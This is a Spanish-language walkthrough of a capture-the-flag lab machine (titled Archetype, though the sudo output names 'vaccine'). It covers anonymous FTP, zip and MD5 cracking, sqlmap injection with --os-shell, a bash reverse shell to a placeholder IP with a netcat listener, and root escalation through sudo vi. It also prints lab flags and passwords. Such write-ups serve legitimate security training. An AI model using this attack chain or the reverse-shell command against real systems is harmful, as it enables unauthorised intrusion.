---
title: Archetype HTB
date: 2023-02-04
---

## Fase de reconocimiento

Tras comprobar si la máquina está activa con ping, en base al ttl, podemos sospechar que se trata de una máquina **linux**. Lanzamos [[nmap]]:

```shell
sudo nmap -p- --open -sS -min-rate 5000 -n -Pn <ip>
```

Obtenemos:

```shell
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

A continuación, tratamos de buscar las versiones y lanzamos scripts de enumeración:

```shell
sudo nmap -p21,22,80 -sCV <ip>
```

Obtenemos:

```shell
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.16.173
|      Logged in as ftpuser
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.0p1 Ubuntu 6ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA)
|   256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA)
|_  256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: MegaCorp Login
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Donde vemos que está permitido loguearse por ftp con un usuario anónimo. Así que nos conectamos, utilizando el nombre de usuario `anonymous`:

```shell
sudo ftp <ip>
```

Una vez dentro, listamos los recursos con `ls`, y vemos un archivo *backup.zip* (aunque ya nos lo había mostrado nmap). Así que lo descargamos con `get backup.zip`.

```shell
ftp 10.129.112.32
Connected to 10.129.112.32.
220 (vsFTPd 3.0.3)
Name (10.129.112.32:naibu3): anonymous
331 Please specify the password.
Password:
230 Login successful.
[...]

ftp> ls
[...]
-rwxr-xr-x    1 0        0            2533 Apr 13  2021 backup.zip
226 Directory send OK.

ftp> get backup.zip
local: backup.zip remote: backup.zip
[...]
226 Transfer complete.
2533 bytes received in 0.04 secs (55.9253 kB/s)
```

Salimos con `exit` y descomprimimos el archivo. Sin embargo, descubrimos que requiere de una contraseña.

```shell
unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
   skipping: index.php               incorrect password
   skipping: style.css               incorrect password
```

Para crackear el fichero utilizaremos *John the ripper*.

## Crackeando el fichero zip con john

Primero, debemos convertir el fichero en un hash con el módulo *zip2john*, para después lanzar john con el rockyou.txt:

```shell
zip2john backup.zip > hashes

ver 2.0 efh 5455 efh 7875 backup.zip/index.php PKZIP Encr: TS_chk, cmplen=1201, decmplen=2594, crc=3A41AE06 ts=5722 cs=5722 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/style.css PKZIP Encr: TS_chk, cmplen=986, decmplen=3274, crc=1B1CCD6A ts=989A cs=989a type=8
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
```

Y lanzamos john:

```shell
sudo john -w=/usr/share/wordlists/rockyou.txt hashes

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press Ctrl-C to abort, or send SIGUSR1 to john process for status
741852963        (backup.zip)     
1g 0:00:00:00 DONE (2023-02-05 23:23) 2.857g/s 11702p/s 11702c/s 11702C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

## Crackeando un hash con hashcat

Ya tenemos la contraseña (`741852963`). Al descomprimir el fichero, encontramos un archivo `index.php`, que contiene unas supuestas credenciales para el usuario administrador (`admin`, `2cb42f8734ea607eefed3b70af13bbd3`) sin embargo, la contraseña parece hasheada.

```php
<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>
[...]
```

Para descifrarla haremos uso de hashcat (para instalarlo `sudo apt install hascat hashid`). Primero debemos identificar el tipo de hash:

```shell
hashid 2cb42f8734ea607eefed3b70af13bbd3

Analyzing '2cb42f8734ea607eefed3b70af13bbd3'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[...]
```

Da una lista bastante larga con posibles formatos, empezaremos probando con MD5:

```shell
echo 2cb42f8734ea607eefed3b70af13bbd3 > hash

hashcat -a 0 -m 0 hash /usr/share/wordlists/rockyou.txt
```

Que nos reporta `2cb42f8734ea607eefed3b70af13bbd3:qwerty789`, de modo que ya tendríamos una contraseña posible para el usuario administrador. 

## Utilizando sqlmap

Una vez nos logueamos, nos damos cuenta de que se trata de una aplicación que accede de forma directa a una base de datos, por lo que intentaremos utilizar alguna inyección sql. Para este propósito utilizaremos `sqlmap` (se instala con `sudo apt install sqlmap`). 

Esta herramienta requiere de la url de la página y de una cookie de sesión para poder tramitar las peticiones. Para conseguir esta última, es posible utilizar burpsuite, pero es más cómodo instalar la extensión `cookie-editor`. La herramienta se invocaría de la siguiente forma:

```shell
sqlmap -u 'http://10.129.112.32/dashboard.php?search=hola' --cookie="PHPSESSID=dhrk7mq8a04en2j5gfsrq97pn0"
```

Durante la ejecución nos reporta lo siguiente `GET parameter 'search' is vulnerable. Do you want to keep testing the others (if any)? [y/N]`, por lo que sabemos que es vulnerable a inyección sql. Por tanto, volvemos a lanzar la herramienta con el parámetro `--os-shell`:

```shell
sqlmap -u 'http://<ip>/dashboard.php?search=hola' --cookie="PHPSESSID=<cookie>" --os-shell
```

De esta forma deberíamos haber obtenido una shell. Sin embargo, no es muy estable e interactiva, por lo que ejecutamos:

```shell
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
```

Y nos ponemos en escucha con netcat por el puerto 443, con tal de mandarnos una reverse shell:

```shell
nc -lvnp 443
```

Una vez ejecutado deberíamos tener una shell con el usuario `postgres`.

## Tratamiento de la tty

En este punto, aplicaremos un [[Tratamiento de la tty]] , con tal de tener una shell más interactiva.

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Una vez completado, la flag de usuario debería estar en `/var/lib/postgresql/user.txt`. (`ec9b13ca4d6229cd5cc1e09980965bf7`).

## Escalada de privilegios

Aunque tengamos la flag, seguimos siendo el usuario *postgres*, podemos comprobar sis somos *sudoers*, pero no conocemos la contraseña de dicho usuario. Comenzamos echando un vistazo a los archivos, si hay alguna contraseña en texto plano debería estar en `/var/www/html`. En dicho directorio encontramos un archivo `dashboard.php`, con la siguiente información:

```php
[...]
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres password=P@s5w0rd!");
[...]
```

Ya tendríamos una probable contraseña para el usuario *postgres* (`P@s5w0rd!`). Como antes vimos, tenemos abierto el puerto 22 (*ssh*), así que podríamos tratar de conectarnos por ssh:

```shell
ssh postgres@<ip>
```

Y volvemos a ejecutar `sudo -l` para comprobar nuestros privilegios:

```shell
sudo -l

Matching Defaults entries for postgres on vaccine:
    env_keep+="LANG LANGUAGE LINGUAS LC_* _XKB_CHARSET", env_keep+="XAPPLRESDIR
    XFILESEARCHPATH XUSERFILESEARCHPATH",
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    mail_badpass

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Lo que nos dice que podemos ejecutar con privilegios de superusuario `/bin/vi /etc/postgresql/11/main/pg_hba.conf`. Con una búsqueda rápida en https://gtfobins.github.io/gtfobins/vi/#sudo, (*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access*), por lo que probamos:

```shell
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh' /dev/null
```

Sin embargo, no nos deja. Por suerte hay más opciones, primero abriremos el archivo:

```shell
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Y una vez dentro pulsamos *:* para introducir instrucciones en vi e introducimos la siguiente línea:

```shell
:set shell=/bin/sh
```

Y después ponemos:

```shell
:shell
```

Y conseguimos una shell, si ejecutamos `whoami`, obtenemos:

```shell
whoami
root
```

Introducimos `bash` para tener una shell en bash y buscamos la flag de root, que estará en `/root/root.txt` (`dd6e058e814260bc70e9bbdef2715849`).